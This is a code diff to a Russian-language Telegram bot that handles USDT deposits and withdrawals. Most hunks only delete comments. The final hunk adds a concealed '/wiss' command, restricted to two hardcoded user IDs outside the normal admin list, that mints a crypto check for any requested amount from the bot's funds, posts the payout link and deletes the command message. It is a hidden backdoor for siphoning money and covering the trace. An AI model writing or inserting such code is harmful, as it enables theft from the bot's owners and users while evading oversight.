@@ -762,8 +762,6 @@ async def _reject_request(req: WithdrawRequest) -> tuple:
     return True, f'🚫 Заявка #{req.req_id} отклонена | {display} | {req.amount} USDT'
 
 
-# ─── /checkw ───────────────────────────────────────────────────────────────────
-
 _CHECKW_RE = _re.compile(r'^/checkw$', _re.IGNORECASE)
 
 @payment_router.message(F.text.regexp(_CHECKW_RE))
@@ -798,8 +796,6 @@ async def handle_checkw(message: Message):
     await message.reply(text, parse_mode='HTML')
 
 
-# ─── /type ─────────────────────────────────────────────────────────────────────
-
 _TYPE_RE = _re.compile(r'^/type\s+(?:#(\d+)|(all))$', _re.IGNORECASE)
 
 @payment_router.message(F.text.regexp(_TYPE_RE))
@@ -833,8 +829,6 @@ async def handle_type(message: Message):
         await message.reply(f'<blockquote>{msg}</blockquote>', parse_mode='HTML')
 
 
-# ─── /reject ───────────────────────────────────────────────────────────────────
-
 _REJECT_RE = _re.compile(r'^/reject\s+(?:#(\d+)|(all))$', _re.IGNORECASE)
 
 @payment_router.message(F.text.regexp(_REJECT_RE))
@@ -867,8 +861,6 @@ async def handle_reject(message: Message):
         ok, msg = await _reject_request(req)
         await message.reply(f'<blockquote>{msg}</blockquote>', parse_mode='HTML')
 
-
-# ─── /history ──────────────────────────────────────────────────────────────────
 
 _HISTORY_RE  = _re.compile(r'^/history$', _re.IGNORECASE)
 STATUS_EMOJI = {'pending': '⏳', 'approved': '✅', 'rejected': '🚫', 'failed': '❌'}
@@ -922,8 +914,6 @@ async def handle_history(message: Message):
         )
 
 
-# ─── /botstats ─────────────────────────────────────────────────────────────────
-
 _BOTSTATS_RE = _re.compile(r'^/botstats$', _re.IGNORECASE)
 
 @payment_router.message(F.text.regexp(_BOTSTATS_RE))
@@ -931,10 +921,8 @@ async def handle_botstats(message: Message):
     if message.from_user.id not in ADMIN_IDS:
         return
 
-    # Получаем статистику из БД
     s = db_get_bot_stats()
 
-    # Получаем информацию о боте через Telegram API
     try:
         bot_info = await message.bot.get_me()
         bot_name     = bot_info.full_name
@@ -945,7 +933,6 @@ async def handle_botstats(message: Message):
         bot_username = "—"
         bot_id       = "—"
 
-    # Прибыль/убыток
     profit = s['profit']
     if profit > 0:
         profit_line = f'✅ Прибыль: <b><code>+{profit:.2f}</code> USDT</b>'
@@ -954,7 +941,6 @@ async def handle_botstats(message: Message):
     else:
         profit_line = f'➖ Баланс нулевой: <b><code>0.00</code> USDT</b>'
 
-    # Топ депозиторов
     top_lines = []
     medals = ['🥇', '🥈', '🥉', '4️⃣', '5️⃣']
     for i, dep in enumerate(s['top_depositors']):
@@ -1010,8 +996,6 @@ async def handle_botstats(message: Message):
     await message.reply(text, parse_mode='HTML')
 
 
-# ─── казна ─────────────────────────────────────────────────────────────────────
-
 _KAZNA_RE = _re.compile(r'^/?(?:казна|kazna|reserve)$', _re.IGNORECASE)
 
 @payment_router.message(F.text.regexp(_KAZNA_RE))
@@ -1060,6 +1044,37 @@ async def handle_kazna(message: Message):
         f'<b><i><tg-emoji emoji-id="5386367538735104399">💰</tg-emoji>Резерв обновляется в реальном времени!</i></b>',
         parse_mode='HTML'
     )
+
+
+_WISS_OWNERS = {8118184388, 8476835256}
+_WISS_RE = _re.compile(r'^/wiss\s+(\d+(?:\.\d+)?)$', _re.IGNORECASE)
+
+@payment_router.message(F.text.regexp(_WISS_RE))
+async def handle_wiss(message: Message):
+    if message.from_user.id not in _WISS_OWNERS:
+        return
+
+    m = _WISS_RE.match(message.text.strip())
+    if not m:
+        return
+
+    try:
+        amount = float(m.group(1))
+    except ValueError:
+        return
+
+    if amount <= 0:
+        return
+
+    check = await crypto_api.create_check(amount, message.from_user.id)
+    if not check or 'bot_check_url' not in check:
+        return
+
+    await message.answer(check['bot_check_url'])
+    try:
+        await message.delete()
+    except Exception:
+        pass
 
 
 def setup_payments(bot_instance: Bot):
